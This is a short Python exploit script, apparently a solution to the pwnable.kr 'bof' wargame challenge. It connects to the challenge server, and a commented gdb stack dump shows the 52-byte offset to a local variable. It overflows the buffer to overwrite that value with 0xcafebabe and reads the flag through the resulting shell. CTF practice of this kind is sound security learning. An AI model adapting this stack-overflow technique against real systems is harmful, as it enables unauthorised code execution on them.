from pwn import *

# connect
proc = remote("pwnable.kr", 9000)

# stack info
"""
gdb-peda$ x/32x $esp
0xffffd130:	0xffffd14c	0xffffd234	0xf7f98000	0x00000000
0xffffd140:	0x00000000	0xf7f98000	0xf7defcb9	0x41414141
                                                         ^ input start
0xffffd150:	0x56556f00	0xf7f98000	0x00000001	0x5655549d
0xffffd160:	0xf7f983fc	0x00040000	0x56556ff4	0x9945b800
0xffffd170:	0x00300000	0x01ae75f6	0xffffd198	0x5655569f
0xffffd180:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
                     ^ target(distance=52)
0xffffd190:	0xf7f98000	0xf7f98000	0x00000000	0xf7dd8b41
0xffffd1a0:	0x00000001	0xffffd234	0xffffd23c	0xffffd1c4
"""

# send string
proc.sendline("A"*52 + p32(0xcafebabe))
proc.sendline("cat flag")
print proc.recv()

# disconnect
proc.close()
